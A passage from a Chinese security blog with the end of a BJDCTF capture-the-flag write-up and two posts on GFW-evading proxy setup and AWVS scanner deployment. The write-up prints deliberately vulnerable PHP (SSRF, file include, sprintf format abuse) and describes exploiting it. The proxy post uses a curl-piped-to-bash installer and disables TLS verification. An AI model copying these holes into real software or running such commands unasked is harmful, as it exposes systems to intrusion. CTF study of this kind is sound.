    &lt;/form&gt;
    &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href=&quot;https://gem-love.com&quot; target=&quot;_blank&quot;&gt;@é¢å¥L&#39;Amore&lt;/a&gt;&lt;/center&gt;&lt;/p&gt;&lt;/span&gt;
&lt;/section&gt;

&lt;script type=&quot;text/javascript&quot; src=&quot;js/classie.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;js/stepsForm.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
    var theForm = document.getElementById( &#39;theForm&#39; );

    new stepsForm( theForm, {
        onSubmit : function( form ) {
            classie.addClass( theForm.querySelector( &#39;.simform-inner&#39; ), &#39;hide&#39; );
            var messageEl = theForm.querySelector( &#39;.final-message&#39; );
            form.submit();
            messageEl.innerHTML = &#39;Ok...Let me have a check&#39;;
            classie.addClass( messageEl, &#39;show&#39; );
        }
    } );
&lt;/script&gt;

&lt;/body&gt;
&lt;/html&gt;
&lt;?php

$filter1 = &#39;/^http:\/\/127\.0\.0\.1\//i&#39;;
$filter2 = &#39;/.?f.?l.?a.?g.?/i&#39;;


if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) {
    $url = $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;;
    $method = $_POST[&#39;q3&#39;];

    $str1 = &quot;~$ python fuck.py -u \&quot;&quot;.$url .&quot;\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;&quot;;

    echo $str1;

    if (!preg_match($filter1, $url) ){
        die($str2);
    }
    if (preg_match($filter2, $url)) {
        die($str3);
    }
    if (!preg_match(&#39;/^GET/i&#39;, $method) &amp;&amp; !preg_match(&#39;/^POST/i&#39;, $method)) {
        die($str4);
    }
    $detect = @file_get_contents($url, false);
    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));
}

?&gt;
</code></pre>
<p>home.php</p>
<pre><code class="php">&lt;?php

setcookie(&quot;y1ng&quot;, sha1(md5(&#39;y1ng&#39;)), time() + 3600);
setcookie(&#39;your_ip_address&#39;, md5($_SERVER[&#39;REMOTE_ADDR&#39;]), time()+3600);

if(isset($_GET[&#39;file&#39;])){
    if (preg_match(&quot;/\^|\~|&amp;|\|/&quot;, $_GET[&#39;file&#39;])) {
        die(&quot;forbidden&quot;);
    }

    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#39;file&#39;])){
        die(&quot;not now!&quot;);
    }

    if(preg_match(&quot;/.?a.?d.?m.?i.?n.?/i&quot;, $_GET[&#39;file&#39;])){
        die(&quot;You! are! not! my! admin!&quot;);
    }

    if(preg_match(&quot;/^home$/i&quot;, $_GET[&#39;file&#39;])){
        die(&quot;不要套娃&quot;);
    }

    else{
        if(preg_match(&quot;/home$/i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;/system$/i&quot;, $_GET[&#39;file&#39;])){
            $file = $_GET[&#39;file&#39;].&quot;.php&quot;;
        }
        else{
            $file = $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;;
        }
        echo &quot;你现在访问的是&quot;.$file . &quot;&lt;br&gt;&quot;;
        require $file;
    }
} else {
    echo &quot;&lt;script&gt;location.href=&#39;./home.php?file=system&#39;&lt;/script&gt;&quot;;
}</code></pre>
<p>我们看到:</p>
<pre><code class="php">$filter1 = &#39;/^http:\/\/127\.0\.0\.1\//i&#39;;
$filter2 = &#39;/.?f.?l.?a.?g.?/i&#39;;    
if (!preg_match($filter1, $url) ){
        die($str2);
    }
    if (preg_match($filter2, $url)) {
        die($str3);
    }
    if (!preg_match(&#39;/^GET/i&#39;, $method) &amp;&amp; !preg_match(&#39;/^POST/i&#39;, $method)) {
        die($str4);
    }
    $detect = @file_get_contents($url, false);
    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));</code></pre>
<p>我们利用<code>$method</code>来转义<code>%d</code>,在<code>$url</code>中加个<code>%s</code>就可以查看ssrf的内容了</p>
<p>扫描目录发现:admin.php,但是要从内网访问</p>
<p>ssrf访问得到</p>
<pre><code class="php">0 &lt;?php
error_reporting(0);
session_start();
$f1ag = &#39;f1ag{s1mpl3_SSRF_@nd_spr1ntf}&#39;; //fake

function aesEn($data, $key)
{
    $method = &#39;AES-128-CBC&#39;;
    $iv = md5($_SERVER[&#39;REMOTE_ADDR&#39;],true);
    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));
}

function Check()
{
    if (isset($_COOKIE[&#39;your_ip_address&#39;]) &amp;&amp; $_COOKIE[&#39;your_ip_address&#39;] === md5($_SERVER[&#39;REMOTE_ADDR&#39;]) &amp;&amp; $_COOKIE[&#39;y1ng&#39;] === sha1(md5(&#39;y1ng&#39;)))
        return true;
    else
        return false;
}

if ( $_SERVER[&#39;REMOTE_ADDR&#39;] == &quot;127.0.0.1&quot; ) {
    highlight_file(__FILE__);
} else {
    echo &quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size=&#39;10px&#39; color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot; . $_SERVER[&#39;REMOTE_ADDR&#39;];
}


$_SESSION[&#39;user&#39;] = md5($_SERVER[&#39;REMOTE_ADDR&#39;]);

if (isset($_GET[&#39;decrypt&#39;])) {
    $decr = $_GET[&#39;decrypt&#39;];
    if (Check()){
        $data = $_SESSION[&#39;secret&#39;];
        include &#39;flag_2sln2ndln2klnlksnf.php&#39;;
        $cipher = aesEn($data, &#39;y1ng&#39;);
        if ($decr === $cipher){
            echo WHAT_YOU_WANT;
        } else {
            die(&#39;爬&#39;);
        }
    } else{
        header(&quot;Refresh:0.1;url=index.php&quot;);
    }
} else {
    //I heard you can break PHP mt_rand seed
    mt_srand(rand(0,9999999));
    $length = mt_rand(40,80);
    $_SESSION[&#39;secret&#39;] = bin2hex(random_bytes($length));
}
?&gt;</code></pre>
<p>我们发现如果我们带decrypt参数直接访问,就不会生成secret了,那么<code>$cipher = aesEn(&#39;&#39;, &#39;y1ng&#39;);</code></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/03/25/BJDCTF/">http://blog.ccreater.top/2020/03/25/BJDCTF/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/03/25/BJDCTF/" data-id="cka3ckr1y000cv4v0dd3v9t6r" data-title="BJDCTF" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-vpn搭建" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/03/20/vpn%E6%90%AD%E5%BB%BA/" class="article-date">
  <time class="dt-published" datetime="2020-03-20T03:17:03.960Z" itemprop="datePublished">2020-03-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/03/20/vpn%E6%90%AD%E5%BB%BA/">vpn搭建</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="vpn搭建小记"><a href="#vpn搭建小记" class="headerlink" title="vpn搭建小记"></a>vpn搭建小记</h1><p>刚好最近有人叫我帮忙搭个vpn自己去了解了一下,发现搭vpn还挺有意思的</p>
<h2 id="vpn的最终方案"><a href="#vpn的最终方案" class="headerlink" title="vpn的最终方案"></a>vpn的最终方案</h2><p>经过自己瞎折腾后最后是搞成这样的:</p>
<p>家宽-内地中转服务器-gfw-国外vps(使用trojan+bbr)</p>
<p>以后打算在gfw和国外vps在加个cdn,这样我们vps对gfw也就是透明的了,以后gfw把我们vps的ip ban掉了也没关系,不太好的影响就是延迟会变高</p>
<p>这里加个中转服务器是因为电信晚上网络会炸裂,而家宽就是电信,虽然手机是联通的,但是我自己一个月40g流量都不够用</p>
<blockquote>
<p>电信 163 网连接国际网络，会在高峰时段，在路由出海前的最后一跳，根据优先级，策略性地人为丢包，以减轻对主网的负担(QOS)，这让普通电信用户糟糕的外网访问质量雪上加霜 </p>
</blockquote>
<h2 id="vpn搭建具体细节"><a href="#vpn搭建具体细节" class="headerlink" title="vpn搭建具体细节"></a>vpn搭建具体细节</h2><h3 id="国外vps选购"><a href="#国外vps选购" class="headerlink" title="国外vps选购"></a>国外vps选购</h3><p>首先是vpn的选购,因为是萌新,就去了别人推荐的vultr,搬瓦工太贵了</p>
<p>听说vultr销毁服务器,再重新购买会有新的ip,但是我这样弄还是同一个被ban掉的ip,后来小脑瓜一动,我一口气开了10个服务器,这样ip就不一样了,我真tm机智/cy</p>
<p>具体怎么选购就百度谷歌吧</p>
<h3 id="国外vps配置"><a href="#国外vps配置" class="headerlink" title="国外vps配置"></a>国外vps配置</h3><p>这里用波仔提供的一键安装脚本,看了一下没啥安全问题</p>
<p> <a href="https://www.v2rayssr.com/trojan-1.html/comment-page-1" target="_blank" rel="noopener">https://www.v2rayssr.com/trojan-1.html/comment-page-1</a> </p>
<p>这里你还需要一个域名,建议用二级域名来弄trojan</p>
<blockquote>
<ol>
<li><p><code>bash &lt;(curl -s -L https://github.com/V2RaySSR/Trojan/raw/master/Trojan.sh)</code></p>
</li>
<li><p>先安装bbr,除了重启的选y,其他都选no</p>
</li>
<li><p>再次运行脚本,运行bbr,并优化配置</p>
</li>
<li><p>安装trojan</p>
</li>
<li><p>下载客户端</p>
</li>
</ol>
</blockquote>
<p>视频教程: <a href="https://www.youtube.com/watch?v=LgZKirXKZms&amp;feature=youtu.be" target="_blank" rel="noopener">https://www.youtube.com/watch?v=LgZKirXKZms&amp;feature=youtu.be</a> </p>
<h3 id="中转服务器配置"><a href="#中转服务器配置" class="headerlink" title="中转服务器配置"></a>中转服务器配置</h3><p>中转服务器去买共享端口+docker虚拟机的那种,一个月5元左右吧,出口最好联通</p>
<p>xxx.sh</p>
<pre><code class="shell">#!/bin/bash
if [ ! $# -eq 3 ];then
    echo -e &quot;Usage : $0 natport trojanserver trojanport&quot;
    exit
fi
natport=$1
trojanserver=$2
trojanport=$3
apt-get install iptables || yum install iptables
iptables -t nat -A PREROUTING -p tcp --dport $natport  -j DNAT --to-destination &quot;$trojanserver:$trojanport&quot;
iptables -t nat -A POSTROUTING -d $trojanserver -p tcp --dport $trojanport -j MASQUERADE
iptables -I FORWARD -d $trojanserver -p tcp --dport  $trojanport -j ACCEPT
iptables -I FORWARD -s $trojanserver  -p tcp --sport  $trojanport -j ACCEPT
service iptables save
service iptables restart
echo &quot;setting complete&quot;</code></pre>
<h3 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h3><p>将config.json拷贝一份,config_through_nat.json</p>
<p>并做出如下修改</p>
<pre><code class="json">{
    ...
    &quot;remote_addr&quot;: &quot;中转服务器ip&quot;,
    &quot;remote_port&quot;: 中转的端口,
   ...
    &quot;ssl&quot;: {
        &quot;verify&quot;: false,
        &quot;verify_hostname&quot;: false,
        ...
    }
    ...
}
</code></pre>
<p>config.json重命名为:config_normal.json</p>
<p>start.bat</p>
<pre><code class="shell">@ECHO OFF
taskkill /im trojan.exe /f
ping -n 2 127.1 &gt;nul
copy /Y config_normal.json config.json
%1 start mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;&quot;&quot;%~0&quot;&quot; ::&quot;,0)(window.close)&amp;&amp;exit
start /b trojan.exe</code></pre>
<p>start_with_nat.bat</p>
<pre><code class="shell">@ECHO OFF
taskkill /im trojan.exe /f
ping -n 2 127.1 &gt;nul
copy /Y config_through_nta.json config.json
%1 start mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;&quot;&quot;%~0&quot;&quot; ::&quot;,0)(window.close)&amp;&amp;exit
start /b trojan.exe</code></pre>
<p>将两个批处理放到trojan客户端目录下</p>
<h2 id="vpn测试"><a href="#vpn测试" class="headerlink" title="vpn测试"></a>vpn测试</h2><p>通过 <a href="https://fast.com/" target="_blank" rel="noopener">https://fast.com/</a>  来测速 稳定10Mbits(联通),5Mbits(电信平时),500Kbits(电信夜间,丢包率贼高,体验极差),稳定1Mbits(走中转服务器路线,因为我专门拿来中转的服务器还没买,暂时直接用阿里云的服务器来中转,但是阿里云服务器也在电信机房),去买了个中转的服务器现在夜间电信稳定5Mbits</p>
<p>利用BEST TRACE来看vps的线路</p>
<p>各种线路的分析文章: <a href="https://www.duangvps.com/archives/135" target="_blank" rel="noopener">https://www.duangvps.com/archives/135</a> </p>
<p>youtube打开4k视频右键查看统计信息,我的是5w左右</p>
<p>linux回程路由测试: <a href="https://github.com/nanqinlang-script/testrace" target="_blank" rel="noopener">https://github.com/nanqinlang-script/testrace</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/03/20/vpn搭建/">http://blog.ccreater.top/2020/03/20/vpn搭建/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/03/20/vpn%E6%90%AD%E5%BB%BA/" data-id="cka3ckr3h0040v4v02lcqgk69" data-title="vpn搭建" class="article-share-link">Share</a>
      
	  
      
      
    </footer>
  </div>
  
</article>





  
    <article id="post-docker部署awvs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/03/18/docker%E9%83%A8%E7%BD%B2awvs/" class="article-date">
  <time class="dt-published" datetime="2020-03-18T09:21:36.011Z" itemprop="datePublished">2020-03-18</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/03/18/docker%E9%83%A8%E7%BD%B2awvs/">docker部署awvs</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="docker部署awvs"><a href="#docker部署awvs" class="headerlink" title="docker部署awvs"></a>docker部署awvs</h1><p>链接: <a href="https://pan.baidu.com/s/1QqtdmgOOd-CCPgmD1aZMCw" target="_blank" rel="noopener">https://pan.baidu.com/s/1QqtdmgOOd-CCPgmD1aZMCw</a> 提取码: buti </p>
<p>将百度云下载内容放到awvs文件夹下</p>
<p>Dockerfile</p>
<pre><code class="dockerfile">FROM ubuntu:16.04
COPY awvs /awvs
EXPOSE 3443
RUN /awvs/setenv.sh&amp;&amp; echo -e &quot;\nyes\nubuntu\nccreater@163.com\nccr,123456\nccr,123456\n&quot;|/awvs/acunetix_13.0.200217097_x64_.sh &amp;&amp; \
cp /awvs/wvsc /home/acunetix/.acunetix/v_200217097/scanner/wvsc &amp;&amp;\
cp /awvs/license_info.json  /home/acunetix/.acunetix/data/license/license_info.json &amp;&amp;\
echo -e &#39;#!/bin/bash\nsu acunetix &amp;&amp; (nohup bash ~/.acunetix/start.sh &amp;) &amp;&amp; exit&#39;&gt; /etc/rc.local
</code></pre>
<p>setenv.sh</p>
<pre><code class="shell">#!/bin/bash

shared_obj_deps=(libpango-1.0.so.0 libXext.so.6 libpthread.so.0 libXi.so.6 libgobject-2.0.so.0 libgtk-3.so.0 libdl.so.2 libgdk_pixbuf-2.0.so.0 libX11.so.6 libuuid.so.1 librt.so.1 libexpat.so.1 libglib-2.0.so.0 libXdamage.so.1 libatk-1.0.so.0 libm.so.6 libatspi.so.0 libcups.so.2 libgio-2.0.so.0 libXfixes.so.3 libXrender.so.1 libxcb.so.1 libsmime3.so libcairo.so.2 libXcomposite.so.1 libgdk-3.so.0 libpangocairo-1.0.so.0 libgcc_s.so.1 libX11-xcb.so.1 libdbus-1.so.3 libnss3.so libXrandr.so.2 libnspr4.so libXcursor.so.1 libnssutil3.so libXss.so.1 libasound.so.2 libatk-bridge-2.0.so.0 libc.so.6 libXtst.so.6)
read -d &#39;&#39; source &lt;&lt;EOF
deb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-properties
deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted
deb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-properties
deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted
deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-properties
deb http://mirrors.aliyun.com/ubuntu/ xenial universe
deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe
deb http://mirrors.aliyun.com/ubuntu/ xenial multiverse
deb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiverse
deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-properties
deb http://archive.canonical.com/ubuntu xenial partner
deb-src http://archive.canonical.com/ubuntu xenial partner
deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted
deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-properties
deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe
deb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse
EOF
echo &quot;$source&quot; &gt; /etc/apt/sources.list 
cat /etc/apt/sources.list 
apt-get update
#for i in ${shared_obj_deps[@]}
#do
#    echo install $i
#    apt-get install $i -y
#done
apt-get install libxdamage1 libgtk-3-0 libasound2 libnss3 libxss1 bzip2 sudo libv8-dev -y
echo &quot;install success&quot;
</code></pre>
<p>将Dockerfile放在awvs同级目录下,打开命令行移动到Dockerfile所在文件夹,<code>docker build -t awvs .</code></p>
<p>用Dockerfile创建镜像后,用<code>docker run --privileged=true -p 443:3443-it -d awvs &quot;/sbin/init&quot;</code>来创建容器</p>
<p>接着等待一会就可以运行了,在改一下本机的hosts,美滋滋,记得是用https去访问</p>
<p><img src="https://i.loli.net/2020/03/18/5nruJk7RmfLYjtw.png" alt="image3135"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://youngrichog.github.io/2019/08/10/Docker-AWVS批量部署/" target="_blank" rel="noopener">https://youngrichog.github.io/2019/08/10/Docker-AWVS%E6%89%B9%E9%87%8F%E9%83%A8%E7%BD%B2/</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/03/18/docker部署awvs/">http://blog.ccreater.top/2020/03/18/docker部署awvs/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/03/18/docker%E9%83%A8%E7%BD%B2awvs/" data-id="cka3ckr2n001tv4v033x5hixe" data-title="docker部署awvs" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li></ul>

    </footer>
  </div>
  
</article>





  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/3/">&lt;- Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/5/">Next -&gt;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 11.67px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/10/15/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">2020西湖论剑</a>
          </li>
        
          <li>
            <a href="/2020/10/15/Service%20Worker/">Service Worker</a>
          </li>
        
          <li>
            <a href="/2020/10/05/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/">FastJson1.2.24调试记录_复现</a>
          </li>
        
          <li>
            <a href="/2020/10/04/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/">2020 ciscn 华东南 web</a>
          </li>
        
          <li>
            <a href="/2020/10/04/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/">jdk7u21反序列化复现</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 ccreater<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
